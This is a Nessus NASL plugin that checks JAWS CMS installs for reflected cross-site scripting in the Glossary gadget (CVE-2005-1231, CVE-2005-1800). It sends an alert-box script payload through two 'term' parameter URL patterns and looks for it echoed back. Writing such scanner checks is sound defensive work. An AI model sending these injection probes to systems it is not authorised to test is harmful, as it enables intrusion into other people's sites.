#
# This script was written by Josh Zlatin-Amishav
#
# This script is released under the GNU GPLv2.
#

# Changes by Tenable:
#   - added CVE xrefs.
#   - added details about the problem to the description.
#   - added See also and Solution.
#   - fixed script family.
#   - fixed exploit and extended it to cover versions 0.4.x.
#   - revised plugin title, added OSVDB refs (4/30/09)


include("compat.inc");

if(description)
{
 script_id(19394);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2005-1231", "CVE-2005-1800");
 script_bugtraq_id(13254, 13796);
 script_xref(name:"OSVDB", value:"15810");
 script_xref(name:"OSVDB", value:"16909");

 script_name(english:"JAWS Glossary Gadget Multiple XSS");

 script_set_attribute(attribute:"synopsis", value:
"A remote web application is vulnerable to Cross Site Scripting attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running JAWS, a content management system written in 
PHP.
The remote version of this software does not perform a proper validation
of user-supplied input to several variables used in the 
'GlossaryModel.php' script, and is therefore vulnerable to cross-site
scripting attacks." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/lists/fulldisclosure/2005/Apr/0416.html" );
 script_set_attribute(attribute:"see_also", value:"http://lists.grok.org.uk/pipermail/full-disclosure/2005-May/034354.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to JAWS 0.5.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );

script_end_attributes();


 script_summary(english:"Checks for HTML injection vulnerabilities in JAWS");
 script_category(ACT_ATTACK);

 script_family(english:"CGI abuses : XSS");
 script_copyright(english:"Copyright (C) 2005-2009 Josh Zlatin-Amishav");

 script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if ( get_kb_item("www/"+port+"/generic_xss") ) exit(0);
if(!can_host_php(port:port)) exit(0);

# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);


# Exploits
exploits = make_list(
  # for 0.5.x
  string("gadget=Glossary&action=ViewTerm&term=", exss),
  # for 0.4.x
  string("gadget=Glossary&action=view&term=", exss)
);


foreach dir ( cgi_dirs() ) {
  foreach exploit (exploits) {
    req = http_get(item:string(dir, "/index.php?", exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

    if (
      'Term does not exists' >< res && 
      xss >< res
    ) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
